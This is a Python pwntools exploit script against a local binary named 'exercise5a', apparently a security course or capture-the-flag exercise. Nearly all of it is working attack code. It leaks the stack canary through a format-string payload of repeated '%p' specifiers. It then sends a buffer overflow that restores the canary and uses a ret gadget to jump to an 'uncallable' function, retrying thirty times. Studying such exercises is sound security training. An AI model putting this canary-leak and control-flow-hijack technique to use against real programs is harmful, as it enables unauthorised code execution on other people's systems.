#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit():
    r = start()

    # You can now communicate with the process, e.g.,
    # r.sendline("AAAAA")
    # r.recvline()
    r.sendline(b"%p;"*15)
    leak = r.recvuntil(b"is not the password").decode()
    canary_hex = leak.split(';')[6]
    canary = int(canary_hex, 16)
    print(f"Canary? {hex(canary)}")
    # Now do the buffer overflow to get uncallable
    print(cyclic_find(0x0000000061616163)) # 8
    print(cyclic_find("aaag")) # 21
    uncallable_add = 0x0401256
    ret_gad = 0x000000000040101a # Use ret gad to fix stak alignment
    r.sendline(b"A"*0x100 + p64(canary) + b"A"*8 + b'\x00'*4 + b"CCCC" + p64(ret_gad) + p64(uncallable_add))
    #r.interactive()
    r.recvuntil(b"Authorized") # get rid of garbage
    print(r.recvall(timeout=1).decode())


for i in range(30):
    try:
        exploit()
    except:
        pass